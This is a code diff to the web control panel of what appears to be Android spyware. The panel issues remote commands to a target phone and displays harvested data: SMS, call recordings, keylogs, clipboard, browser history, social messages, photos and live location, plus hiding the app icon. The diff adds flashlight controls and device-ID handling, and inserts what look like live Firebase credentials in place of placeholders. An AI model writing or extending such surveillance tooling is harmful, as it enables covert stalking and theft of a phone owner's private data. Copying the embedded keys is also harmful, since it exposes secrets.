@@ -596,6 +596,10 @@
         <button onclick="sendCommand('LOCK_DEVICE')"><span>🔒</span> Lock Screen</button>
         <button onclick="showSendSmsPanel()"><span>✉️</span> Send SMS</button>
         <button onclick="sendCommand('VIBRATE', { duration: 1000 })"><span>📳</span> Vibrate (1s)</button>
+        <button onclick="sendCommand('FLASH_ON')"><span>🔦</span> Flash On</button>
+        <button onclick="sendCommand('FLASH_OFF')"><span>🔦</span> Flash Off</button>
+        <button onclick="sendCommand('FLASH_TIMED', { duration: 5000 })"><span>⏱️</span> Flash 5s</button>
+        <button onclick="sendCommand('FLASH_BLINK', { duration: 10000, interval: 500 })"><span>✨</span> Flash Blink</button>
         <button onclick="showFirebaseSettingsPanel()" style="border-left:3px solid #ff6f00"><span>🔥</span> Firebase Setup</button>
     </div>
 
@@ -660,6 +664,7 @@
 
     // Track the last command sent to interpret raw responses
     let pendingCommand = null;
+    let currentDeviceId = null; // Will be set when device registers
 
     const panel = document.getElementById('main-panel');
     const statusEl = document.getElementById('status');
@@ -706,6 +711,7 @@
         }
         const payload = {
             type: 'SIGNALING',
+            deviceId: currentDeviceId, // Include deviceId if known
             data: msg
         };
         ws.send(JSON.stringify(payload));
@@ -1043,11 +1049,13 @@
             command: command,
             requestId: requestId,
             params: params,
+            deviceId: currentDeviceId, // Include deviceId if known
             timestamp: Date.now()
         };
         ws.send(JSON.stringify(payload));
         panel.innerHTML = `📤 Command sent: ${command}`;
         pendingCommand = command;
+        console.log('Sent command:', command, params);
         setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
     }
 
@@ -1064,22 +1072,29 @@
     // ---------- PLAIN TEXT / JSON HANDLERS ----------
     function handleJSON(json) {
         console.log('handleJSON:', json.type, json);
+        
+        // Store device ID if present
+        if (json.deviceId) {
+            currentDeviceId = json.deviceId;
+        }
+        
         switch (json.type) {
+            // Basic responses
             case 'SMS_DATA':
                 dataType = 'sms';
-                currentData = json.data;
+                currentData = Array.isArray(json.data) ? json.data : [];
                 renderTable();
                 pendingCommand = null;
                 break;
             case 'CALL_LOGS':
                 dataType = 'call';
-                currentData = json.data;
+                currentData = Array.isArray(json.data) ? json.data : [];
                 renderTable();
                 pendingCommand = null;
                 break;
             case 'FILE_LIST':
                 dataType = 'file';
-                currentData = json.data;
+                currentData = Array.isArray(json.data) ? json.data : [];
                 renderFiles();
                 pendingCommand = null;
                 break;
@@ -1103,6 +1118,8 @@
                 setStatus(json.status);
                 pendingCommand = null;
                 break;
+                
+            // App icon visibility
             case 'APP_HIDDEN':
                 iconHidden = true;
                 document.getElementById('iconBtn').innerText = 'Show Icon';
@@ -1115,6 +1132,26 @@
                 showNotification('App icon shown');
                 pendingCommand = null;
                 break;
+                
+            // Flashlight commands
+            case 'FLASH_ON':
+                showNotification('🔦 Flashlight ON');
+                pendingCommand = null;
+                break;
+            case 'FLASH_OFF':
+                showNotification('🔦 Flashlight OFF');
+                pendingCommand = null;
+                break;
+            case 'FLASH_TIMED':
+                showNotification('⏱️ Flash timed complete');
+                pendingCommand = null;
+                break;
+            case 'FLASH_BLINK':
+                showNotification('✨ Flash blink complete');
+                pendingCommand = null;
+                break;
+                
+            // Screen share
             case 'SCREEN_SHARE_STARTED':
                 screenActive = true;
                 document.getElementById('screenBtn').innerText = 'Stop Screen';
@@ -1128,49 +1165,55 @@
                 showNotification('Screen share stopped');
                 pendingCommand = null;
                 break;
+                
+            // Data responses
             case 'CONTACTS_DATA':
-                displayContacts(parseData(json.data));
+                displayContacts(json.data);
                 pendingCommand = null;
                 break;
             case 'INSTALLED_APPS':
-                displayInstalledApps(parseData(json.data));
+                displayInstalledApps(json.data);
                 pendingCommand = null;
                 break;
             case 'APP_USAGE_DATA':
-                displayAppUsage(parseData(json.data));
+                displayAppUsage(json.data);
                 pendingCommand = null;
                 break;
             case 'NOTIFICATIONS_DATA':
-                displayNotifications(parseData(json.data));
+                displayNotifications(json.data);
                 pendingCommand = null;
                 break;
             case 'NOTIFICATIONS_CLEARED':
                 showNotification('Notifications cleared');
+                pendingCommand = null;
                 break;
             case 'BROWSER_HISTORY_DATA':
-                displayBrowserHistory(parseData(json.data));
+                displayBrowserHistory(json.data);
                 pendingCommand = null;
                 break;
             case 'KEYLOG_DATA':
-                displayKeylog(parseData(json.data));
+                displayKeylog(json.data);
                 pendingCommand = null;
                 break;
             case 'KEYLOG_CLEARED':
                 showNotification('Keylog cleared');
+                pendingCommand = null;
                 break;
             case 'CLIPBOARD_DATA':
-                displayClipboard(parseData(json.data));
+                displayClipboard(json.data);
                 pendingCommand = null;
                 break;
             case 'WIFI_NETWORKS_DATA':
-                displayWifiNetworks(parseData(json.data));
+                displayWifiNetworks(json.data);
                 pendingCommand = null;
                 break;
             case 'GEOFENCE_SET':
                 showNotification('✅ Geofence activated');
+                pendingCommand = null;
                 break;
             case 'GEOFENCE_CLEARED':
                 showNotification('Geofence cleared');
+                pendingCommand = null;
                 break;
             case 'GEOFENCE_INFO': {
                 const gfInfo = json.data;
@@ -1179,38 +1222,48 @@
                 } else {
                     panel.innerHTML = '<h3>🗺️ Geofence</h3><p style="color:#999">No active geofence.</p>';
                 }
+                pendingCommand = null;
                 break;
             }
             case 'GEOFENCE_ALERT': {
                 const gfMsg = json.event === 'EXIT' ? '🚨 DEVICE LEFT safe zone!' : '✅ Device returned to safe zone';
                 pushAlert('Geofence', gfMsg);
                 showNotification(gfMsg);
+                pendingCommand = null;
                 break;
             }
             case 'SCHEDULED_CAPTURE_SET':
                 showNotification('✅ Auto-capture started');
+                pendingCommand = null;
                 break;
             case 'SCHEDULED_CAPTURE_STOPPED':
                 showNotification('Auto-capture stopped');
+                pendingCommand = null;
                 break;
             case 'DEVICE_LOCKED':
                 showNotification('🔒 Screen locked');
+                pendingCommand = null;
                 break;
             case 'SMS_SENT':
                 showNotification('✅ SMS sent successfully');
+                pendingCommand = null;
                 break;
             case 'FILE_DELETED':
                 showNotification('File deleted');
                 sendCommand('LIST_FILES', { path: currentPath });
+                pendingCommand = null;
                 break;
             case 'VIBRATE_COMPLETE':
                 showNotification('📳 Vibrated');
+                pendingCommand = null;
                 break;
             case 'UNINSTALL_INITIATED':
                 showNotification('Uninstall initiated');
+                pendingCommand = null;
                 break;
             case 'APP_OPENED':
                 showNotification('App opened');
+                pendingCommand = null;
                 break;
             case 'GPS_UPDATES_STOPPED': {
                 liveGpsActive = false;
@@ -1220,81 +1273,110 @@
                     gpsBtn.style.cssText = '';
                 }
                 showNotification('GPS tracking stopped');
+                pendingCommand = null;
+                break;
+            }
+            // GPS Update (live tracking)
+            case 'LOCATION_UPDATE': {
+                if (liveGpsActive) {
+                    renderMap(json.data);
+                }
+                pendingCommand = null;
                 break;
             }
             // ── Feature 1: Social Messages ─────────────────────────────────
             case 'SOCIAL_MESSAGES_DATA':
-                displaySocialMessages(parseData(json.data));
+                displaySocialMessages(json.data);
                 pendingCommand = null;
                 break;
             case 'NOTIFICATION_LIVE':
                 pushLiveNotification(json);
+                pendingCommand = null;
                 break;
             // ── Feature 2: Call Recordings ─────────────────────────────────
             case 'CALL_RECORDINGS_DATA':
-                displayCallRecordings(parseData(json.data));
+                displayCallRecordings(json.data);
                 pendingCommand = null;
                 break;
             case 'CALL_AUDIO_DATA': {
-                const _aud = parseData(json.data);
+                const _aud = json.data;
                 if (_aud && _aud.audio) playCallRecording(_aud);
                 pendingCommand = null;
                 break;
             }
             case 'CALL_ALERT':
                 handleCallAlert(json);
+                pendingCommand = null;
                 break;
             // ── Feature 3: Photo Gallery ───────────────────────────────────
             case 'RECENT_IMAGES_DATA':
-                displayPhotoGallery(parseData(json.data));
+                displayPhotoGallery(json.data);
                 pendingCommand = null;
                 break;
             case 'IMAGE_DATA': {
-                const _img = parseData(json.data);
+                const _img = json.data;
                 if (_img && _img.image) showFullImage(_img.image, _img.mediaId);
                 pendingCommand = null;
                 break;
             }
             // ── Feature 7: Location History ────────────────────────────────
             case 'LOCATION_HISTORY_DATA':
-                displayLocationHistory(parseData(json.data));
+                displayLocationHistory(json.data);
                 pendingCommand = null;
                 break;
             // ── Feature 5+6: App Events ────────────────────────────────────
             case 'APP_EVENTS_DATA':
-                displayAppEvents(parseData(json.data));
+                displayAppEvents(json.data);
                 pendingCommand = null;
                 break;
             case 'APP_INSTALLED':
                 pushAlert('📱 App Installed', (json.name || json.pkg));
                 showNotification('📱 Installed: ' + (json.name || json.pkg));
+                pendingCommand = null;
                 break;
             case 'APP_REMOVED':
                 pushAlert('🗑️ App Removed', (json.name || json.pkg));
                 showNotification('🗑️ Removed: ' + (json.name || json.pkg));
+                pendingCommand = null;
                 break;
             // ── Feature 8: SMS Keywords ────────────────────────────────────
             case 'SMS_KEYWORDS_SET':
                 showNotification('✅ Keywords saved: ' + json.data);
+                pendingCommand = null;
                 break;
             case 'SMS_KEYWORDS_DATA':
-                displaySmsKeywords(parseData(json.data));
+                displaySmsKeywords(json.data);
                 pendingCommand = null;
                 break;
             case 'SMS_KEYWORDS_CLEARED':
                 showNotification('Keywords cleared');
+                pendingCommand = null;
                 break;
             case 'SMS_ALERTS_DATA':
-                displaySmsAlerts(parseData(json.data));
+                displaySmsAlerts(json.data);
                 pendingCommand = null;
                 break;
             case 'SMS_KEYWORD_ALERT':
                 pushAlert('🔑 Keyword: ' + json.keyword,
                     'From ' + json.from + ': ' + json.body);
                 showNotification('🔑 "' + json.keyword + '" from ' + json.from);
+                pendingCommand = null;
                 break;
+                
+            // Device registration
+            case 'DEVICE_REGISTRATION':
+                currentDeviceId = json.deviceId;
+                showNotification('Device registered: ' + json.name);
+                break;
+                
+            // Heartbeat
+            case 'HEARTBEAT':
+                // Just ignore, it's keepalive
+                break;
+                
             default:
                 console.log('Unhandled JSON type:', json.type);
+                // Try to handle as array data
                 if (pendingCommand === 'LIST_FILES' && Array.isArray(json)) {
                     dataType = 'file';
                     currentData = json;
@@ -1319,6 +1401,8 @@
     }
 
     function handlePlainText(msg) {
+        console.log('Plain text received:', msg);
+        
         if (msg.startsWith("STATUS:")) {
             setStatus(msg.substring(7));
             pendingCommand = null;
@@ -1377,6 +1461,18 @@
             document.getElementById('iconBtn').innerText = 'Hide Icon';
             showNotification('App icon shown');
             pendingCommand = null;
+        } else if (msg.startsWith("FLASH_ON")) {
+            showNotification('🔦 Flashlight ON');
+            pendingCommand = null;
+        } else if (msg.startsWith("FLASH_OFF")) {
+            showNotification('🔦 Flashlight OFF');
+            pendingCommand = null;
+        } else if (msg.startsWith("FLASH_TIMED")) {
+            showNotification('⏱️ Flash timed complete');
+            pendingCommand = null;
+        } else if (msg.startsWith("FLASH_BLINK")) {
+            showNotification('✨ Flash blink complete');
+            pendingCommand = null;
         } else if (msg.startsWith("VIBRATE_DONE")) {
             showNotification('Vibration done');
             pendingCommand = null;
@@ -1387,6 +1483,8 @@
             const base64 = msg.substring(10);
             downloadBase64(base64, 'downloaded_file');
             pendingCommand = null;
+        } else if (msg.startsWith("I_AM_DEVICE")) {
+            console.log('Device identified');
         } else if (msg.startsWith('[') || msg.startsWith('{')) {
             try {
                 const parsed = JSON.parse(msg);
@@ -1586,7 +1684,7 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
         let headers = [], rows = [];
         if (dataType === 'sms') {
             headers = ['Type', 'Number', 'Message', 'Date'];
-            rows = currentData.map(item => [item.type, item.number, item.body, item.date]);
+            rows = currentData.map(item => [item.type, item.address, item.body, item.date]);
         } else if (dataType === 'call') {
             headers = ['Type', 'Number', 'Name', 'Date', 'Duration'];
             rows = currentData.map(item => [
@@ -2987,12 +3085,12 @@ window.addEventListener('load', () => {
 // ── Replace these values with your Firebase project config ────────────────
 // Firebase Console → Project Settings → Your Apps → Web App → SDK Config
 var firebaseConfig = {
-    apiKey:            "YOUR_API_KEY",
-    authDomain:        "YOUR_PROJECT.firebaseapp.com",
-    projectId:         "YOUR_PROJECT_ID",
-    storageBucket:     "YOUR_PROJECT.appspot.com",
-    messagingSenderId: "YOUR_SENDER_ID",
-    appId:             "YOUR_APP_ID"
+    apiKey:            "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc",
+    authDomain:        "webviewiot.firebaseapp.com",
+    projectId:         "webviewiot",
+    storageBucket:     "webviewiot.firebasestorage.app",
+    messagingSenderId: "634777347775",
+    appId:             "1:634777347775:web:f8efc5bcdf19e3f1de880a"
 };
 
 // Load saved config from localStorage (set via 🔥 Firebase Setup panel)
